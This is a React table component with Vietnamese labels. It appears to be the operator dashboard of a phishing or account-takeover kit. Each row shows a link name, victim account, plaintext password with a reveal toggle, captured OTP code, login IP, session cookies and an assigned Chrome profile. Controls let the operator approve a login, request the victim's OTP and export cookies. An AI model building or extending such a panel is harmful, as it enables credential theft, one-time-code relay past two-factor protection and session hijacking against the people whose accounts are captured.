import React, { useState } from 'react';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Button } from '@/components/ui/button';
import { Checkbox } from '@/components/ui/checkbox';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Copy, HardDrive, Send, Eye, EyeOff, MoreVertical, Check, ShieldQuestion, CheckSquare } from 'lucide-react';
import { useToast } from '@/components/ui/use-toast';
import { motion, AnimatePresence } from 'framer-motion';
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from '@/components/ui/dropdown-menu';

const getStatusBadge = (status) => {
    if (!status) return 'bg-gray-500/20 text-gray-400 border border-gray-500/30';
    if (status.startsWith('✅')) return 'bg-green-500/20 text-green-400 border border-green-500/30';
    if (status.startsWith('🟡 Chờ phê duyệt')) return 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/30';
    if (status.startsWith('🟡 Chờ OTP')) return 'bg-blue-500/20 text-blue-400 border border-blue-500/30';
    if (status.startsWith('📝')) return 'bg-purple-500/20 text-purple-400 border border-purple-500/30';
    if (status.startsWith('❌')) return 'bg-red-500/20 text-red-400 border border-red-500/30';
    if (status.startsWith('🟠')) return 'bg-orange-500/20 text-orange-400 border border-orange-500/30';
    if (status.startsWith('🤖')) return 'bg-indigo-500/20 text-indigo-400 border border-indigo-500/30';
    return 'bg-gray-500/20 text-gray-400 border border-gray-500/30';
};

const PasswordCell = ({ password }) => {
    const [show, setShow] = useState(false);
    return (
        <div className="flex items-center space-x-1">
            <span>{show ? password : '••••••••••'}</span>
            <Button variant="ghost" size="icon_sm" className="h-6 w-6" onClick={() => setShow(!show)}>
                {show ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
            </Button>
        </div>
    );
};

export const LoginControlTable = ({ data, toast, onSendNotification, selectedRows, setSelectedRows, onOpenProfile, notificationTemplates, onApprove, onRequestOtp }) => {
    const handleSelectAll = (checked) => {
        if (checked) {
            setSelectedRows(new Set(data.map(item => item.id)));
        } else {
            setSelectedRows(new Set());
        }
    };

    const handleSelectRow = (id) => {
        const newSelectedRows = new Set(selectedRows);
        if (newSelectedRows.has(id)) {
            newSelectedRows.delete(id);
        } else {
            newSelectedRows.add(id);
        }
        setSelectedRows(newSelectedRows);
    };

    const copyToClipboard = (text) => {
        if (!text) return;
        navigator.clipboard.writeText(text);
        toast({ title: 'Đã sao chép!', description: `Đã sao chép: ${text.substring(0, 30)}...` });
    };

    return (
        <div className="overflow-x-auto">
            <Table>
                <TableHeader>
                    <TableRow className="hover:bg-transparent border-b-border">
                        <TableHead className="w-[50px]">
                            <Checkbox
                                checked={selectedRows.size === data.length && data.length > 0}
                                onCheckedChange={handleSelectAll}
                                disabled={data.length === 0}
                            />
                        </TableHead>
                        {['STT, Thời Gian', 'Tên Link', 'Tài Khoản', 'Mật khẩu', 'Code-OTP', 'IP Login', 'Trạng Thái', 'Cookies', 'Chrome chỉ định', 'Thông báo', 'Hành động'].map(header => (
                            <TableHead key={header} className="text-gray-400 font-semibold whitespace-nowrap px-2">{header}</TableHead>
                        ))}
                    </TableRow>
                </TableHeader>
                <TableBody>
                     <AnimatePresence>
                        {data.map((item, index) => (
                            <motion.tr 
                                key={item.id} 
                                className="border-b-border hover:bg-primary/5"
                                layout
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                exit={{ opacity: 0 }}
                                data-state={selectedRows.has(item.id) ? 'selected' : ''}
                            >
                                <TableCell className="px-2">
                                    <Checkbox
                                        checked={selectedRows.has(item.id)}
                                        onCheckedChange={() => handleSelectRow(item.id)}
                                    />
                                </TableCell>
                                <TableCell className="text-gray-400 text-xs px-2">
                                    <div className="font-bold text-white">{index + 1}</div>
                                    <div>{new Date(item.time).toLocaleDateString('vi-VN')}</div>
                                    <div>{new Date(item.time).toLocaleTimeString('vi-VN')}</div>
                                </TableCell>
                                <TableCell className="text-white font-medium px-2">{item.linkName}</TableCell>
                                <TableCell className="text-gray-300 px-2">
                                    <div className="flex items-center">
                                        <span>{item.account}</span>
                                        <Button variant="ghost" size="icon_sm" className="ml-1 opacity-50 hover:opacity-100 h-6 w-6" onClick={() => copyToClipboard(item.account)}><Copy className="h-3 w-3"/></Button>
                                    </div>
                                </TableCell>
                                <TableCell className="text-gray-300 px-2">
                                    <PasswordCell password={item.password} />
                                </TableCell>
                                <TableCell className="text-yellow-300 font-mono px-2">{item.otp || 'N/A'}</TableCell>
                                <TableCell className="text-gray-300 px-2">
                                    <div className="flex items-center">
                                        <span>{item.ip}</span>
                                        <Button variant="ghost" size="icon_sm" className="ml-1 opacity-50 hover:opacity-100 h-6 w-6" onClick={() => copyToClipboard(item.ip)}><Copy className="h-3 w-3"/></Button>
                                    </div>
                                </TableCell>
                                <TableCell className="px-2"><span className={`px-2 py-1 text-xs rounded-md whitespace-nowrap ${getStatusBadge(item.status)}`}>{item.status}</span></TableCell>
                                <TableCell className="text-gray-300 px-2">
                                    <div className="flex items-center">
                                        <span className="truncate max-w-[100px]">{item.cookie}</span>
                                        <Button variant="ghost" size="icon_sm" className="ml-1 opacity-50 hover:opacity-100 h-6 w-6" onClick={() => copyToClipboard(item.cookie)}><Copy className="h-3 w-3"/></Button>
                                    </div>
                                </TableCell>
                                <TableCell className="px-2">
                                    <Button variant="secondary" size="sm" className="bg-blue-900/50 text-blue-300 hover:bg-blue-800/50" onClick={() => onOpenProfile(item)}>
                                        <HardDrive className="h-4 w-4 mr-2" />
                                        {item.chrome}
                                    </Button>
                                </TableCell>
                                <TableCell className="px-2">
                                    <div className="flex items-center space-x-1">
                                        <Select onValueChange={(templateId) => onSendNotification(item.id, templateId)}>
                                          <SelectTrigger className="w-[120px] bg-background h-8 text-xs">
                                            <SelectValue placeholder="Chọn mẫu..." />
                                          </SelectTrigger>
                                          <SelectContent>
                                            {notificationTemplates.map(template => (
                                                <SelectItem key={template.id} value={template.id.toString()}>{template.title}</SelectItem>
                                            ))}
                                          </SelectContent>
                                        </Select>
                                        <Button variant="ghost" size="icon_sm" className="h-8 w-8 text-cyan-400 hover:text-cyan-300">
                                            <Send className="h-4 w-4" />
                                        </Button>
                                    </div>
                                </TableCell>
                                <TableCell className="px-2">
                                    {item.status === '🟡 Chờ phê duyệt' || item.status === '📝 Đã nhập OTP' ? (
                                        <div className="flex gap-2">
                                            <Button onClick={() => onApprove(item)} size="sm" className="bg-green-600 hover:bg-green-700 h-8 px-2">
                                                <Check className="h-4 w-4 mr-1" /> Duyệt
                                            </Button>
                                            {item.status === '🟡 Chờ phê duyệt' && (
                                                <Button onClick={() => onRequestOtp(item.id)} size="sm" className="bg-blue-600 hover:bg-blue-700 h-8 px-2">
                                                    <ShieldQuestion className="h-4 w-4 mr-1" /> OTP
                                                </Button>
                                            )}
                                        </div>
                                    ) : (
                                        <DropdownMenu>
                                            <DropdownMenuTrigger asChild>
                                                <Button variant="ghost" size="icon_sm"><MoreVertical className="h-4 w-4" /></Button>
                                            </DropdownMenuTrigger>
                                            <DropdownMenuContent>
                                                <DropdownMenuItem onSelect={() => toast({title: "Chạy lại"})}>Chạy lại</DropdownMenuItem>
                                                <DropdownMenuItem onSelect={() => toast({title: "Xóa"})}>Xóa</DropdownMenuItem>
                                                <DropdownMenuItem onSelect={() => copyToClipboard(item.cookie)}>Xuất Cookie</DropdownMenuItem>
                                            </DropdownMenuContent>
                                        </DropdownMenu>
                                    )}
                                </TableCell>
                            </motion.tr>
                        ))}
                    </AnimatePresence>
                </TableBody>
            </Table>
             {data.length === 0 && (
                <div className="text-center py-16 text-gray-500">
                    Không có dữ liệu.
                </div>
            )}
        </div>
    );
};